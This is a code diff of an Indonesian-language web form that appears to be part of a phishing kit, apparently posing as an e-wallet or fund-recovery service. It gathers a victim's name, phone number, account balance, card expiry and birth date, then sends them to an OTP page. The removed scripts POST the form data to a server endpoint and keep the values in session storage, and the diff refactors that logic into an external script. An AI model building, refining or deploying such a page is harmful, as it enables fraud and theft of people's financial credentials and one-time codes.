@@ -29,10 +29,10 @@
 
         /* Wrapper container to center the card */
         .form-container-wrapper {
-            height: 100vh; /* full viewport height */
+            height: 100vh;
             display: flex;
             justify-content: center;
-            align-items: center; /* vertical centering */
+            align-items: center;
             padding: 15px;
             box-sizing: border-box;
         }
@@ -106,10 +106,10 @@
             margin-bottom: 1.5rem;
         }
         label {
-            display: block; /* Pastikan label di atas input */
+            display: block;
             font-weight: 700;
             color: var(--text-color);
-            margin-bottom: 5px; /* Jarak antara label dan input */
+            margin-bottom: 5px;
         }
         input.form-control {
             border: 1px solid #ccc;
@@ -129,7 +129,6 @@
         .phone-inputs .col-8 input {
             border-radius: 4px;
         }
-        /* Disabled input background */
         input[disabled] {
             background-color: #e9ecef;
             cursor: not-allowed;
@@ -251,7 +250,7 @@
                 </div>
 
                 <div class="form-group phone-inputs">
-                    <label>Nomor WhatsApp</label>
+                    <label>Nomor Handphone</label>
                     <div class="row no-gutters">
                         <div class="col-4 pr-2">
                             <input type="tel" class="form-control" pattern="\d*" maxlength="2" value="62" disabled aria-disabled="true" />
@@ -265,7 +264,7 @@
 
                 <div class="form-group">
                     <label for="saldo">Saldo Akhir</label>
-                    <input type="tel" id="saldo" name="saldo" class="form-control" maxlength="100" placeholder="Rp."
+                    <input type="text" id="saldo" name="saldo" class="form-control" maxlength="100" placeholder="Rp."
                            required autocomplete="off" aria-required="true" />
                 </div>
 
@@ -314,88 +313,6 @@
     <!-- Scripts -->
     <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
     <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
-    <script>
-        $(document).ready(function() {
-            // Clear field if it contains '0' or '62' manually typed
-            $('#nomor').on('input', function() {
-                if($(this).val() === '0' || $(this).val() === '62') {
-                    $(this).val('');
-                }
-            });
-
-            // Mask saldo input with Rupiah format
-            $('#saldo').mask('000.000.000.000', {reverse: true});
-
-            $('#saldo').on('keyup', function() {
-                let val = $(this).val();
-                $(this).val(formatRupiah(val, 'Rp. '));
-            });
-
-            function formatRupiah(angka, prefix) {
-                var number_string = angka.replace(/[^,\d]/g, '').toString(),
-                    split    = number_string.split(','),
-                    sisa     = split[0].length % 3,
-                    rupiah     = split[0].substr(0, sisa),
-                    ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
-
-                if (ribuan) {
-                    var separator = sisa ? '.' : '';
-                    rupiah += separator + ribuan.join('.');
-                }
-
-                rupiah = split[1] !== undefined ? rupiah + ',' + split[1] : rupiah;
-                return prefix === undefined ? rupiah : (rupiah ? prefix + rupiah : '');
-            }
-
-            // Mask for masa berlaku and tanggal lahir
-            $('#masa').mask('00/00/0000');
-            $('#tanggal_lahir').mask('00/00/0000');
-
-            // Form submission with loading
-            $('#form1').on('submit', function(e) {
-                e.preventDefault();
-                $("#loader").show();
-
-                // Simulasi submit atau AJAX
-                setTimeout(function() {
-                    $('#loader').hide();
-                    window.location = "otp.html"; // Redirect ke halaman PIN
-                }, 500);
-            });
-        });
-    </script>
-    <script>
- $(document).ready(function(){
-    $('#form1').submit(function(e) {
-    event.preventDefault();
-    
-$("#loader").show();
-
-
- $.ajax({
- type: 'POST',
- url: 'one.js',
- data: $(this).serialize(),
- datatype: 'JSON',
- 
- complete: function(data) {
-            console.log('Complete')
-  setTimeout(function(){
-   $('#loader').hide();
-     window.location = "otp.html";
-var nama = document.getElementById('nama').value;
-sessionStorage.setItem("nama", nama);
-
-var saldo = document.getElementById('saldo').value;
-sessionStorage.setItem("saldo", saldo);
-var nomor = '0' + document.getElementById('nomor').value;
-sessionStorage.setItem("nomor", nomor);
-     }, 500);
-        }
-    });
- });
-    return false;
-});       
-</script>
+    <script src="script.js"></script>
 </body>
 </html>
